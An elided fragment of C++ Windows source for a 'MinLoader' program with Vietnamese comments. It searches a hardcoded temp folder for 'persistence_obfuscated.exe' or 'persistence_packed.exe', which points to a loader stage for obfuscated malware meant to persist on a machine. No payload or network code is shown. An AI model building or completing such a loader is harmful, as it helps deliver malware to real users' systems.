...
#define PERSISTENCE_PACKED_FILE L"persistence_packed.exe"
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    ...
    try
    {
        ...
        LogToFile("Starting MinLoader with absolute paths");

        // Lấy đường dẫn đến thư mục temp cố định
        LogToFile("Using hardcoded temp path: " + WideToNarrow(HARDCODED_TEMP_PATH));

        // Tìm file mục tiêu trong thư mục temp cố định
        std::wstring targetFile = L"";

        // Thử tìm persistence_obfuscated.exe
        targetFile = CheckFileExistence(HARDCODED_TEMP_PATH, PERSISTENCE_OBFUSCATED_FILE);

        // Nếu không tìm thấy, thử persistence_packed.exe
        if (targetFile.empty())
        {
            targetFile = CheckFileExistence(HARDCODED_TEMP_PATH, PERSISTENCE_PACKED_FILE);

            // Nếu vẫn không tìm thấy, hiển thị thông báo lỗi
            if (targetFile.empty())
            {
                LogToFile("Could not find target files in hardcoded temp path!");
                MessageBoxW(NULL, L"Could not find persistence_obfuscated.exe or persistence_packed.exe in C:\\Users\\a\\AppData\\Local\\Temp\\!", L"Error", MB_ICONERROR);
                return 1;
            }
        }
